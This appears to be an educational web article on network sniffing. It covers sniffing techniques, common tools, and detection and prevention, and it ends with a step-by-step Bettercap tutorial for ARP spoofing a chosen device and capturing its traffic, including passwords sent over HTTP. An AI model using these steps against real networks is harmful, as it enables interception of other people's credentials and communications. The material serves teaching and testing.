**Network sniffing** is the process of **capturing and analyzing network traffic** to monitor communications, troubleshoot network issues, or intercept sensitive data. Sniffers can be used for **legitimate purposes** like network diagnostics and performance monitoring, but they can also be exploited by **attackers to steal credentials, eavesdrop on conversations, or inject malicious packets**.

Sniffing works by capturing **packets traveling through a network**. Depending on the method used, it can be:

1. **Passive Sniffing** – Monitoring network traffic **without interfering** with data flow (used in unencrypted networks or when connected to a hub).
   
2. **Active Sniffing** – Actively manipulating network traffic (e.g., ARP spoofing, DNS spoofing) to intercept data even on switched networks.


Placing a device on the network that plugs into a SPAN port of a layer2/layer3 switch can accomplish network sniffing in either passive sniffing or active mode. An application loaded on a virtual machine spanning several virtual network interfaces could also do sniffing.

Network engineers, security operations networks, and application security teams commonly use network sniffer tools. These tools collect all traffic across specific subnets or traffic sent to a SPAN port. Network sniffers are a valuable tool for detecting rogue devices, including Wi-Fi access points, printers, and Internet of Things (IoT) devices recently introduced into the network.

There are three standard sniffing techniques by hackers and internal networking teams:

**1. MAC Spoofing**

MAC spoofing is the practice of changing a device's Media Access Control (MAC) address, which is a unique hardware identifier used on networks. Instead of using the factory-assigned MAC address, spoofing allows a device to appear as another device on the network, potentially circumventing network restrictions or security measures.

**2. MAC Flooding**

A MAC flooding attack is **a network threat that targets the limited storage of a switch's MAC address table**. The attacker sends a large number of packets with fake or random MAC addresses, quickly filling up the table.

**3. DNS Cache Poisoning/Evil Twin**

DNS cache poisoning, also known as DNS spoofing, is a cyberattack where attackers inject fake DNS records into a DNS server's cache, causing users to be redirected to malicious or fake websites when they attempt to access a legitimate domain.


## Standard Tools for Network Sniffing

Network and security teams have a wide variety of sniffing tools available. Cybersecurity solution manufacturers sell many of these tools. While others are available through the open-source community. Here is a short list of tools:

**Wireshark**

Wireshark is one of the most used sniffer tools. The tool helps capture valuable network telemetry information between sources and designations within the network. The hacker community also commonly uses this open source.

The tool has a very easy-to-use UI filled with pre-configured filtering to help engineers troubleshoot faster.

**tcpdump**

tcpdump is a computer program that analyzes data network packets and operates through a command-line interface. This tool allows the user to monitor TCP/IP and other packets being sent or received over the network to which the computer is connected. Tcpdump is free software available under the BSD license.



### How to Detect Network Sniffing?

Detecting network sniffing is challenging for most network and security teams. Organizations with substantial investments in Wireshare, or tcpdump face even more significant challenges in discovering and blocking rogue sniffing technology.

The first key indicator would be excessive network traffic directed to a specific host. This sudden increase in network utilization could be the first step in detecting a new or rogue entity on the network.

Organizations concerned about this increase in traffic should invest in tools like Anti-Sniff, Sniff Detection, or Snort.

### Preventing Network Sniffing

Network and security teams have several options to prevent rogue network sniffing. As more organizations extend their networks and applications into hybrid cloud and third-party hosted portals, detecting and preventing their traffic from being exposed and deploying these countermeasures must become a top priority.

**Use Encryption**

Organizations in the EU and other parts of the world already have an encryption presence. Healthcare information, personal information within the EU, or similar data within California require encryption. Ensuring all data is at rest and in transit, even within the internal network, stays encrypted helps prevent rogue sniffers from reading your data.

**Implement Network Segmentation**

Network segmentation continues to gain traction within organizations. It prevents ransomware attacks from spreading laterally within their target’s network. Attacks stop when they attempt to communicate with non-standard or unapproved ports.

This same network security capability also helps stop rogue sniffing behavior. Defining network segments allowing traffic sent from many ports into one can help. Preventing one-to-many copying is ideal for stopping a rogue sniffer from functioning. Network and security teams, through network segment policies, can designate only specific ports and hosts that can communicate in one-to-many capacities.

**Regular Network Audits**

Another valuable workstream organization should execute a regular network audit to validate only specific MAC addresses and IP addresses and communicate between the various segments. Hackers will attempt to alter their victim’s network, connect using a spoofed MAC or IP address, or try to load malware on an internal host. These security breach attempts should warrant an organization to hire third-party penetration testing to validate that the network security controls, including ACLs, firewalls, and intrusion detection systems, are functional, updated, and effective in stopping rogue sniffing activities.

**Use Intrusion Detection Systems (IDS)**

Intrusion detection systems (IDS) based on SNORT signatures became replaced with more advanced NDR powered by artificial intelligence (AI) and machine learning (ML). NDR capabilities live within the network to help spot changes in behavior, access, and bandwidth consumption. AI plays a critical role in preventing rogue sniffing. Hackers will rapidly alter their methods to embed their sniffer inside their target’s network and cloud segments. Using AI, hackers often deploy decoy sniffers within their target’s network, attempting to overwhelm the internal SecOps teams.

## Network Sniffing using Bettercap in Linux



Sniffing is the process of capturing and monitoring data packets that are passed through the network. It is used to capture the data of the victim and bettercap is a powerful tool used to perform various MITM(man in the middle) attacks on a network. Also, ARP Spoofing is a type of attack in which an attacker sends false ARP (Address Resolution Protocol) messages over a LAN(local area network). 

Note: You need to be connected with the network on which you want to sniff. Type these all command on the terminal

### Approach for Sniffing using Bettercap

Step 1:  Selecting the `interface of wlan0` i.e Wi-Fi. You can also try it with LAN (local area network ), It will work the same as with Wi-Fi. -iface command is used for selecting the interface. You can use the command ****ifconfig**** to get all the interfaces for example if you are connected with an eth0 you need to type bettercap -iface eth0 to get into the bettercap interface.

```
bettercap  -iface wlan0
```

![bettercap -iface](https://media.geeksforgeeks.org/wp-content/uploads/20201225114237/pic1.png)

Step 2: To show all the devices that are connected to the same network with their IP, MAC, Name, etc. Now we need to copy the IP address of the devices on which we want to sniff.  

```
net.show
```

![net.show in bettercap](https://media.geeksforgeeks.org/wp-content/uploads/20201225120424/pic2.png)

Step 3: This will provide you with the Modules of bettercap with their status ( i.e running or not running )

```
help
```

![bettercap help](https://media.geeksforgeeks.org/wp-content/uploads/20201225120926/pic3.png)

Step 4: This will send various probe packets to each IP in order and in the present subnet so that net.recon module may detect them with ease.

```
net.probe on
```

![net.probe on in bettercap](https://media.geeksforgeeks.org/wp-content/uploads/20201225133917/pic4.png)

Step 5:**** In order to attack both the targets and the gateway, we will have to set arp.spoof.fullduplex to true.

```
set arp.spoof.fullduplex true
```

Step 6:**** Set the target to the IP you can add any number of IPs here by using “,”. For example 192.168.43.157 ,192.168.43.152

```
set arp.spoof.targets 192.168.43.157(IP address of the target Device)
```

Step 7:**** Start the ARP spoofer 

```
arp.spoof on
```

![Start the ARP spoofer ](https://media.geeksforgeeks.org/wp-content/uploads/20201225134448/pic7.png)

Step 8:**** Setting it to true will consider packets from/to this computer, otherwise it will skip them. As we are MITM (man in the middle) that means all the data is transferring from our computer

```
set net.sniff.local true
```

![set net.sniff.local true](https://media.geeksforgeeks.org/wp-content/uploads/20201225134555/pic8.png)

Step 9:**** Turning on the sniffing and catching the packets.

```
net.sniff on
```

![Turning on the sniffing and catching the packets](https://media.geeksforgeeks.org/wp-content/uploads/20201225134626/pic9.png)

**Note**:  After these all steps you can get the data of the targets only for the unsecured sites like the sites with the “http” for the https and the hosts there are some more steps involved in it. For now, you can get all the data entered by the target on the unsecured sites even the passwords. Just perform these steps on the website after signing off a written agreement with the owner of the website.
